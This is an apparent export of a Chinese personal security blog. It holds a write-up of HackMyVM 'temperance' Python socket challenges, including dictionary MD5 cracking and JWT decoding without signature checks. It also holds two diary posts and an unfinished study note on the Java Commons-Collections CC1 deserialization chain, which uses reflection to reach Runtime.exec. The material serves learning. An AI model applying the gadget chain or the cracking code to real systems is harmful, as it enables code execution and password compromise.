<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HMVlabs-temperance</title>
    <url>/2024/06/03/HMVlabs-temperance/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>前段时间就想着要好好把python练一练，刚好最近hmv新出了一个labs，其实不是很难，但我还是要gpt帮助，算是把一些语法巩固了一下，昨晚还是觉得要记一下，不然做完了不回顾其实没什么增长。</p>
<h4 id="levelx00"><a href="#levelx00" class="headerlink" title="levelx00"></a>levelx00</h4><p>一开始还花了点时间理解这个lab要怎么打，第一关就是带入门，先看看整体代码逻辑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;temperance.hackmyvm.eu&quot;</span></span><br><span class="line">PORT = <span class="number">9988</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s: <span class="comment"># 建立socker连接</span></span><br><span class="line">    s.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Receiving Intro&#x27;</span>)	<span class="comment"># 接收信息</span></span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">    s.send(<span class="string">b&#x27;levelx00&#x27;</span>) <span class="comment"># 发生选择的关卡，后续都是通过这个控制关卡</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Receiving challenge.&#x27;</span>)</span><br><span class="line">    data2 = s.recv(<span class="number">1024</span>) <span class="comment"># 接收数据，后续做一些处理</span></span><br><span class="line">    <span class="built_in">print</span>(data2)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">    s.send(data2)	<span class="comment"># 处理后再发过去</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Recibo flag&#x27;</span>)</span><br><span class="line">    data3 = s.recv(<span class="number">1024</span>) <span class="comment"># 如果是对方期望的数据，会返回flag，用recv接收</span></span><br><span class="line">    <span class="built_in">print</span>(data3)</span><br></pre></td></tr></table></figure>

<p>就是这样执行这个代码，就能获得第一关的flag，后续每一关都有新的要求，接收数据，对数据进行处理然后发回去</p>
<p>前几关都太简单了，我直接记录一些我觉得比较可说的</p>
<h4 id="levelx06"><a href="#levelx06" class="headerlink" title="levelx06"></a>levelx06</h4><p>“In this mission you will receive a string and you must return its length. (as string, not as int).”</p>
<p>接收一个字符串，注意这个关卡接受的数据都是byte型，进行一些字符处理还要转换成str</p>
<p>经历了这个，我更清晰了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符-&gt;bytes:data.encode()</span><br><span class="line">bytes-&gt;字符:string.decode()</span><br></pre></td></tr></table></figure>

<p>所以06发送回去的数据应该是，要转成bytes型</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s.send((<span class="built_in">str</span>(<span class="built_in">len</span>(data2))).encode())</span><br></pre></td></tr></table></figure>

<h4 id="levelx08"><a href="#levelx08" class="headerlink" title="levelx08"></a>levelx08</h4><p>“In this mission you will receive 2 numbers, you must return the result of adding both.”</p>
<p>接收一个两个数字，返回相加的结果，借助split分割出来，列表里面是bytes型，然后强制转换成int型，s.send不能发int型要先转成str再转成bytes型，不能to_bytes()，我发现会自动变成ascii</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = s.recv(<span class="number">1024</span>)</span><br><span class="line">  <span class="built_in">print</span>(data2)</span><br><span class="line"></span><br><span class="line">  numbers=data2.split()</span><br><span class="line">  <span class="built_in">print</span>(numbers)</span><br><span class="line">  result=(<span class="built_in">int</span>(numbers[<span class="number">0</span>]) + <span class="built_in">int</span>(numbers[<span class="number">1</span>]))</span><br><span class="line">  <span class="comment"># Send the challenge solved / Envia el resultado del challenge.</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">  s.send(<span class="built_in">str</span>(result).encode())</span><br></pre></td></tr></table></figure>

<h4 id="levelx09"><a href="#levelx09" class="headerlink" title="levelx09"></a>levelx09</h4><p>rot13解密，直接找函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rot13</span>(<span class="params">i</span>):</span><br><span class="line">    cipher = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> i.isupper():</span><br><span class="line">        <span class="keyword">if</span> <span class="number">90</span> &gt;= <span class="built_in">ord</span>(i) + <span class="number">13</span>:</span><br><span class="line">            cipher += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) + <span class="number">13</span> - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="number">13</span> - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span>)</span><br><span class="line">    <span class="keyword">elif</span> i.islower():</span><br><span class="line">        <span class="keyword">if</span> <span class="number">122</span> &gt;= <span class="built_in">ord</span>(i) + <span class="number">13</span>:</span><br><span class="line">            cipher += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) + <span class="number">13</span> - <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="number">13</span> - <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cipher += i</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br></pre></td></tr></table></figure>

<h4 id="levelx10"><a href="#levelx10" class="headerlink" title="levelx10"></a>levelx10</h4><p>“In this mission you will receive numbers separated by spaces, you must return them in order from  smallest to largest and without separating them with spaces. “</p>
<p>接收：80 37 67 41 31 要返回：3137416780</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment"># 转str</span></span><br><span class="line">  nums = data2.split() <span class="comment"># 按空格分割</span></span><br><span class="line">  int_list = [<span class="built_in">int</span>(item) <span class="keyword">for</span> item <span class="keyword">in</span> nums] <span class="comment"># 列表每个元素都转成int</span></span><br><span class="line">  sorted_list = <span class="built_in">sorted</span>(nums) <span class="comment"># 排序</span></span><br><span class="line">  data3 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> sorted_list: <span class="comment"># 拼接起来</span></span><br><span class="line">      data3 += i</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">  s.send(data3.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h4 id="levelx13"><a href="#levelx13" class="headerlink" title="levelx13"></a>levelx13</h4><p>“In this mission you receive a list of strings, you must sort them alphabetically and return the last string in the list. The characters “[“ and “]” must be removed.”</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240603105035.png" ></p>
<p>就是给很多字符串排序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">data2 = data2[<span class="number">1</span>:-<span class="number">1</span>] <span class="comment"># 去除前后[]</span></span><br><span class="line">ss = data2.split() </span><br><span class="line">ss = <span class="built_in">sorted</span>(ss) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">s.send(ss[-<span class="number">1</span>].encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h4 id="levelx17"><a href="#levelx17" class="headerlink" title="levelx17"></a>levelx17</h4><p>“ In this mission you receive a 1 pixel png encoded in base64, you must decode it and return the last RGBA value.”</p>
<p>生成一张图片然后要找出里面最后一个RGBA数据，这个就要用到特定的库</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> imagesize  <span class="comment"># 需要用到这三个库</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image </span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"> 。。。。。。。</span><br><span class="line">		data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    decoded_data = base64.b64decode(data2)</span><br><span class="line">    image = Image.<span class="built_in">open</span>(BytesIO(decoded_data)) <span class="comment"># 将解码后的数据转换为图像</span></span><br><span class="line">    rgba_data = image.convert(<span class="string">&quot;RGBA&quot;</span>).getdata() <span class="comment"># 用库里的函数提取出RGBA数据</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Send the challenge solved / Envia el resultado del challenge.</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">    s.send(<span class="built_in">str</span>(rgba_data[-<span class="number">1</span>][-<span class="number">1</span>]).encode())</span><br></pre></td></tr></table></figure>

<h4 id="levelx19"><a href="#levelx19" class="headerlink" title="levelx19"></a>levelx19</h4><p>接收一段数据，base64解密，写入一个新建的zip，解压读取里面HMV.txt的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">。。。。。。</span><br><span class="line">    data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    data2 = base64.b64decode(data2)</span><br><span class="line">    zip_filename = <span class="string">&quot;decoded_archive.zip&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(zip_filename, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> zip_file: <span class="comment"># 把解码后的内容新建一个zip写入</span></span><br><span class="line">        zip_file.write(data2)</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref: </span><br><span class="line">        txt_filename = <span class="string">&quot;HMV.txt&quot;</span></span><br><span class="line">        <span class="keyword">with</span> zip_ref.<span class="built_in">open</span>(txt_filename) <span class="keyword">as</span> txt_file: <span class="comment"># 读取txt内容</span></span><br><span class="line">            txt_content = txt_file.read()</span><br><span class="line">            <span class="built_in">print</span>(txt_content)</span><br></pre></td></tr></table></figure>

<h4 id="levelx20"><a href="#levelx20" class="headerlink" title="levelx20"></a>levelx20</h4><p>rockyou前五十个词作为字典，接收一个md5，去爆破找出原文是字典中的哪一个</p>
<p>命令行读取txt文件前五十行数据，<em>head -n 50 rockuou.txt</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">common_passwords = [</span><br><span class="line">    <span class="string">&quot;123456&quot;</span>,<span class="string">&quot;12345&quot;</span>,<span class="string">&quot;123456789&quot;</span>,<span class="string">&quot;password&quot;</span>,<span class="string">&quot;iloveyou&quot;</span>,<span class="string">&quot;princess&quot;</span>,<span class="string">&quot;1234567&quot;</span>,<span class="string">&quot;rockyou&quot;</span>,</span><br><span class="line">    <span class="string">&quot;12345678&quot;</span>,<span class="string">&quot;abc123&quot;</span>,<span class="string">&quot;nicole&quot;</span>,<span class="string">&quot;daniel&quot;</span>,<span class="string">&quot;babygirl&quot;</span>,<span class="string">&quot;monkey&quot;</span>,<span class="string">&quot;lovely&quot;</span>,<span class="string">&quot;jessica&quot;</span>,<span class="string">&quot;654321&quot;</span>,<span class="string">&quot;michael&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ashley&quot;</span>,<span class="string">&quot;qwerty&quot;</span>,<span class="string">&quot;111111&quot;</span>,<span class="string">&quot;iloveu&quot;</span>,<span class="string">&quot;000000&quot;</span>,<span class="string">&quot;michelle&quot;</span>,<span class="string">&quot;tigger&quot;</span>,<span class="string">&quot;sunshine&quot;</span>,<span class="string">&quot;chocolate&quot;</span>,<span class="string">&quot;password1&quot;</span>,</span><br><span class="line">   <span class="string">&quot;soccer&quot;</span>,<span class="string">&quot;anthony&quot;</span>,<span class="string">&quot;friends&quot;</span>,<span class="string">&quot;butterfly&quot;</span>,<span class="string">&quot;purple&quot;</span>,<span class="string">&quot;angel&quot;</span>,<span class="string">&quot;jordan&quot;</span>,<span class="string">&quot;liverpool&quot;</span>,<span class="string">&quot;justin&quot;</span>,<span class="string">&quot;loveme&quot;</span>,<span class="string">&quot;fuckyou&quot;</span>,</span><br><span class="line">    <span class="string">&quot;123123&quot;</span>,<span class="string">&quot;football&quot;</span>,<span class="string">&quot;secret&quot;</span>,<span class="string">&quot;andrea&quot;</span>,<span class="string">&quot;carlos&quot;</span>,<span class="string">&quot;jennifer&quot;</span>,<span class="string">&quot;joshua&quot;</span>,<span class="string">&quot;bubbles&quot;</span>,<span class="string">&quot;1234567890&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;hannah&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash1</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(text.encode()).hexdigest() <span class="comment"># 生成md5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_md5</span>(<span class="params">md5_hash</span>):</span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> common_passwords:</span><br><span class="line">        <span class="keyword">if</span> md5_hash == md5_hash1(password): <span class="comment"># 一个一个去对比，找到了就返回</span></span><br><span class="line">            <span class="keyword">return</span> password</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> 。。。。。。</span><br><span class="line"></span><br><span class="line">		data2 = crack_md5(data2)</span><br><span class="line">  	s.send(data2.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h4 id="levelx25"><a href="#levelx25" class="headerlink" title="levelx25"></a>levelx25</h4><p>接收到数据是个url，发送请求然后读取返回包的header</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">  response = requests.get(data2)</span><br><span class="line">  header = response.headers.get(<span class="string">&#x27;Hmv-Code&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="levelx26"><a href="#levelx26" class="headerlink" title="levelx26"></a>levelx26</h4><p>生成一张图片，要识别出里面的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">。。。。。。。</span><br><span class="line">    data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    decoded_data = base64.b64decode(data2)</span><br><span class="line">    image = Image.<span class="built_in">open</span>(BytesIO(decoded_data))</span><br><span class="line">    image.save(<span class="string">&quot;decoded_image.png&quot;</span>)</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&quot;decoded_image.png&quot;</span>)</span><br><span class="line">    text = pytesseract.image_to_string(img) <span class="comment"># 主要是用这个库，但是有时候不是很准确</span></span><br></pre></td></tr></table></figure>

<h4 id="levelx27"><a href="#levelx27" class="headerlink" title="levelx27"></a>levelx27</h4><p>接收到数据是个url，发送请求然后返回的是&#x2F;etc&#x2F;passwd的内容，要提取里面用户proxy的uid</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">response = requests.get(data2)</span><br><span class="line">html_content = response.text</span><br><span class="line">ll = html_content.split(<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 按换行分割</span></span><br><span class="line">pp = ll[-<span class="number">3</span>].split(<span class="string">&#x27;:&#x27;</span>) <span class="comment"># 再按：分割</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Envio reto&#x27;</span>)</span><br><span class="line">s.send(<span class="built_in">str</span>(pp[<span class="number">2</span>]).encode()) 发送第三个字段也就是UID</span><br></pre></td></tr></table></figure>

<h4 id="levelx28"><a href="#levelx28" class="headerlink" title="levelx28"></a>levelx28</h4><p>jwt解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extract_hmv_key</span>(<span class="params">token</span>):</span><br><span class="line">    decoded_token = jwt.decode(token, options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    hmv_key = decoded_token.get(<span class="string">&#x27;HMVKey&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> hmv_key</span><br></pre></td></tr></table></figure>

<h4 id="levelx29"><a href="#levelx29" class="headerlink" title="levelx29"></a>levelx29</h4><p>发送两个坐标计算他们之间的距离，这个要用到特定的库（在此用umz的代码）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240603112230.png" ></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> geopy.distance <span class="keyword">import</span> geodesic</span><br><span class="line">。。。。。。</span><br><span class="line">		pattern = <span class="string">r&quot;Lat: (\d+) Lon: (\d+) - Lat: (\d+) Lon: (\d+)&quot;</span></span><br><span class="line">    matches = re.<span class="keyword">match</span>(pattern, data2)</span><br><span class="line">    <span class="keyword">if</span> matches:</span><br><span class="line">        coord1 = (<span class="built_in">int</span>(matches.group(<span class="number">1</span>)), <span class="built_in">int</span>(matches.group(<span class="number">2</span>)))</span><br><span class="line">        coord2 = (<span class="built_in">int</span>(matches.group(<span class="number">3</span>)), <span class="built_in">int</span>(matches.group(<span class="number">4</span>)))</span><br><span class="line">    distance = geodesic(coord1, coord2).kilometers</span><br><span class="line">    formatted_distance = <span class="string">&quot;&#123;:.3f&#125;&quot;</span>.<span class="built_in">format</span>(distance)</span><br><span class="line">    s.send(formatted_distance.encode())</span><br></pre></td></tr></table></figure>

<h4 id="levelx31"><a href="#levelx31" class="headerlink" title="levelx31"></a>levelx31</h4><p>要识别二维码，也是用到特定的库</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan_qr_code</span>(<span class="params">image_path</span>):</span><br><span class="line">    <span class="comment"># 打开图片</span></span><br><span class="line">    image = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    <span class="comment"># 解码图片中的二维码</span></span><br><span class="line">    decoded_objects = decode(image)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出解码结果</span></span><br><span class="line">    <span class="keyword">for</span> obj <span class="keyword">in</span> decoded_objects:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Type:&#x27;</span>, obj.<span class="built_in">type</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Data:&#x27;</span>, obj.data)</span><br><span class="line">        <span class="keyword">return</span> obj.data</span><br><span class="line">。。。。。。。。</span><br><span class="line">		data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    decoded_data = base64.b64decode(data2)</span><br><span class="line">    image = Image.<span class="built_in">open</span>(BytesIO(decoded_data))</span><br><span class="line">    image.save(<span class="string">&quot;qr.png&quot;</span>)</span><br><span class="line">    image = Image.<span class="built_in">open</span>(<span class="string">&quot;qr.png&quot;</span>)</span><br><span class="line">    img_path = <span class="string">&#x27;qr.png&#x27;</span></span><br><span class="line">    image.save(img_path)</span><br><span class="line"></span><br><span class="line">    data2 = scan_qr_code(img_path) <span class="comment"># 扫码</span></span><br></pre></td></tr></table></figure>

<h4 id="levelx32"><a href="#levelx32" class="headerlink" title="levelx32"></a>levelx32</h4><p>“In this mission you receive an md5 and a string. You must permute the string until it matches md5 and return the string.”</p>
<p>有一个md5，和一个字符串，重新排序字符串，找出那个md5的原文</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">。。。。。。。</span><br><span class="line">		data2 = data2.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    md = data2.split()[<span class="number">0</span>]</span><br><span class="line">    key = data2.split()[<span class="number">1</span>]</span><br><span class="line">    permutations = itertools.permutations(key)</span><br><span class="line">    <span class="keyword">for</span> perm <span class="keyword">in</span> permutations:</span><br><span class="line">        perm_str = <span class="string">&#x27;&#x27;</span>.join(perm)</span><br><span class="line">        perm_md5 = hashlib.md5(perm_str.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> perm_md5 == md:</span><br><span class="line">            data2 = perm_str</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h4 id="写完了"><a href="#写完了" class="headerlink" title="写完了"></a>写完了</h4><p>ai太牛了，一点一点调，加深对知识的印象，但是写完这个感觉自己蠢蠢的。。。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>9.4回校小记</title>
    <url>/2024/09/04/9-4%E5%9B%9E%E6%A0%A1%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<p>随便说点，结束了hw，在北京多呆了四天，四处逛逛，今天回到学校，开始坐牢生活</p>
<p>回到宿舍，发现有的室友报名了教资   ，有的室友在开始准备雅思，真的有大三的实感了，大家在开始走往不同的方向</p>
<p>言归正传，新学期新气象，还要磨练技术，这段时间真的认识到好多同龄但是厉害很多的师傅，自己离他们还有一大截，这篇博客简单记录，公开出来（虽然不知道有多少人会看到）警醒自己不能再懒散了…</p>
]]></content>
      <tags>
        <tag>杂</tag>
        <tag>生活记录</tag>
      </tags>
  </entry>
  <entry>
    <title>7.28深夜小记</title>
    <url>/2024/07/28/7-28%E6%B7%B1%E5%A4%9C%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<p>好久没更新博客了，一方面是因为在家的时候放假太安逸有点懒了，一方面是因为现在来北京了，最近在做项目（牛马），这么晚还不睡是因为在调作息，希望明天晚上夜班不要瞌睡。</p>
<p>然后一个人手机也刷累了就不知道要干啥，学习也学不太下，最近生活被工作挤占了，有点停止了思考（虽然有空思考的时候也没思考出什么，依旧对未来充满迷茫😕</p>
<p>打开电脑看看这看看那，就想着写篇博客记录下这一晚上吧</p>
<p>附：今晚一个人爽吃麦当劳薯条（吐槽一下本挑食人目前在北京没吃到什么特别好吃的东西</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240730035355.png"   style="zoom:50%;" >

<p>吃完骑车兜风随手拍</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240730035326.png"   style="zoom:50%;" >

<p>写于7.28凌晨</p>
]]></content>
      <tags>
        <tag>杂</tag>
        <tag>生活记录</tag>
      </tags>
  </entry>
  <entry>
    <title>cc1学习笔记</title>
    <url>/2024/11/29/cc1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>本篇文章单纯记录自己学习cc1的过程，里面遇到一些点有些难理解，我总是试图记录下来帮助自己理解（虽然有些时候纠结的点很蠢:)，所以整理出来算是监督自己学习吧。自己java基础不是很扎实，可能有理解不对的地方，非常欢迎联系我（wx：Lintian3188）指正，感谢🙏</p>
<h4 id="反射调用runtime执行calc"><a href="#反射调用runtime执行calc" class="headerlink" title="反射调用runtime执行calc"></a>反射调用runtime执行calc</h4><p>正常调用runtime执行calc语句应该是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br></pre></td></tr></table></figure>

<p>反射是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> getRuntime.invoke(<span class="literal">null</span>);</span><br><span class="line">exec.invoke(o, <span class="string">&quot;Open -a Calculator&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>第一句使用Class.forName 动态加载Runtime，此时的c是Runtime的class对象</p>
<p>第二句使用getMethod获取到getRuntime方法，返回的是Method对象</p>
<p>第三局继续使用getMethod获取exec方法有一个String.class是因为exec正常调用的时候就需要一个参数String</p>
<p>第四句使用inoke也就是执行getRuntime，看一下源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Runtime</span> <span class="variable">currentRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runtime</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title function_">getRuntime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就是执行这个方法刚好会返回一个currentRuntime，这个变量是Runtime类型的对象，<strong>有这个才能让我们exec正常调用</strong></p>
<p>可以理解成<code>Object o = getRuntime.invoke(null);</code>执行效果等于<code>Runtime.getRuntime()</code></p>
<p>第五句invoke 的第一个参数是目标实例对象 o，第二个参数是方法的实际参数，所以就相当于执行了Runtime.getRuntime().exec</p>
<h4 id="为什么cc1链子终点是InvokerTransformer-transform"><a href="#为什么cc1链子终点是InvokerTransformer-transform" class="headerlink" title="为什么cc1链子终点是InvokerTransformer.transform()"></a>为什么cc1链子终点是InvokerTransformer.transform()</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241127222026796.png" ></p>
<p>直接跟进到这个类，里面的<code>transform</code>方法用到了反射，我们最后就是要利用这个很灵活的机制实现恶意代码执行</p>
<p>我们一开始直接调用查看</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;); <span class="comment">// 这个InvokerTransformer构造的要求</span></span><br><span class="line">        invokerTransformer.transform(runtime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>InvokerTransformer.transform()</code>方法里面，<code>iMethodName</code>对应我们前面构造的<code>exec</code>，<code>iParamTypes</code>对应<code>String.class</code>，<code>iArgs</code>对应我们要执行的命令，在<code>public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</code>来看，这写都完美对应我们这次反射调用Runtime执行命令的逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, iArgs);</span><br></pre></td></tr></table></figure>

<h3 id="TransformedMap版"><a href="#TransformedMap版" class="headerlink" title="TransformedMap版"></a>TransformedMap版</h3><h4 id="初步的链子"><a href="#初步的链子" class="headerlink" title="初步的链子"></a>初步的链子</h4><p>就是点击这个函数右键查找用法，有很多调用的地方，我们需要筛出比较合适的</p>
<p>链子的正确顺序就是找到<code>TransformedMap</code>的<code>checkSetValue()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241127231528425.png" ></p>
<p>里面调用了valueTransformer.transform(value);，跟进看一下<code>valueTransformer</code>是什么</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241127231711828.png" ></p>
<p>能在TransformedMap的一个构造方法里面发现它被调用，然后他的作用域是<strong>proteced</strong>，还要在TransformedMap里找到谁去调用了这个方法，定位到了<code>decorate()</code>，这个是public方法</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241127232849716.png" >其实传入的参数及户没有差别，感觉就是多了一层，就理解为自我装饰吧</p>
